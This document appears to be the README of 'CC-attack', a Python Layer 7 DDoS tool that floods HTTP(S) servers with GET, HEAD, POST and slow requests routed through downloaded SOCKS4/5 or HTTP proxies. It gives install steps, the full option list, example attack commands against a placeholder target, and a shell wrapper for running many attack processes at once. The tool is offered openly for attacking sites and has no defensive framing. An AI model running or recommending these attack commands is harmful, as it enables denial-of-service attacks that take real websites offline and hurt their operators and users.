       /////    /////    /////////////
      CCCCC/   CCCCC/   | CC-attack |/
     CC/      CC/       |-----------|/ 
     CC/      CC/       |  Layer 7  |/ 
     CC/////  CC/////   | ddos tool |/ 
      CCCCC/   CCCCC/   |___________|/

# CC-attack ![](https://img.shields.io/badge/Version-3.7.1-brightgreen.svg) ![](https://img.shields.io/badge/license-GPLv2-blue.svg)
 A script for using socks4/5 or http proxies to attack http(s) server.

 News:
- ✅ Added Support of HTTP proxies
- ✅ Updated proxy list based on rewritten script.
- ❌ Proxy checker are currently not working for now. You can still use the script without checking the proxy.

 Info:
- ✅ Using Python3
- ✅ Added more human-like options
- ✅ Http Get/Head/Post/Slow Flood
- ✅ Random Http Header/Data
- ✅ Socks4/5 Proxies Downloader
- ✅ Socks4/5 Proxies Checker
- ✅ Customize Cookies
- ✅ Customize Post Data 
- ✅ Support HTTPS
- ✅ Support Socks4/5

## Showcase
Using multiproc.sh with socks4 on a vps
![](https://i.imgur.com/KLJIZs8.png)

Attack requests from Cloudflare activity log
![](https://i.ibb.co/ySTWQ2M/Screenshot-119.png)

## Install
    If you only have one version of python:
    git clone https://github.com/Ni3zam/CC-attack.git
    cd CC-attack
    pip install -r requirements.txt
    python cc.py -help

    If you are using multiple version of python:
    git clone https://github.com/Ni3zam/CC-attack.git
    cd CC-attack
    pip3 install -r requirements.txt
    python3 cc.py -help

## Usage

    python cc.py <arguments> / python3 cc.py <arguments>

```
===============  CC-attack help list  ===============
   -h/help   | showing this message
   -url      | set target url
   -m/mode   | set program mode
   -data     | set post data path (only works on post mode)
             | (Example: -data data.json)
   -cookies  | set cookies (Example: 'id:xxx;ua:xxx')
   -v        | set proxy type (4/5/http, default:5)
   -t        | set threads number (default:800)
   -f        | set proxies file (default:proxy.txt)
   -b        | enable/disable brute mode
             | Enable=1 Disable=0  (default:0)
   -s        | set attack time(default:60)
   -down     | download proxies
   -check    | check proxies
=====================================================
```
### Some example of the usage
Download socks5 proxies as proxy.txt:
```
python3 cc.py -down -f proxy.txt -v 5
```
Attack a target with custom proxies list(socks4.txt) for 30 seconds :
```
python3 cc.py -url http://target.com -f socks4.txt -v 4 -s 30
```

## Usage of multiproc.sh
```
This script is using for increasing the performance of cc.py.
Due to the suck performance of python since it has a GIL lock,
And I am lazy to make a multiprocess version.
There is a option for linux user to increase their performance of cc.py

This script basicly just run cc.py multiple times to make it "multi-processing"

First, put this script and cc.py in the same folder.

Then prepare the proxies list by yourself or just run "python3 cc.py -down -v 4" (-v socks version)

After that, change the number of process.

At last, change atk_cmd to your command and run the script by "bash multiproc.sh"
```
Example setup of multiproc.sh (-v socks version) (-s attack time)
```
atk_cmd="python3 cc.py -url http://target.com -v 4 -s 60"

#number of process that you want
process=10

```
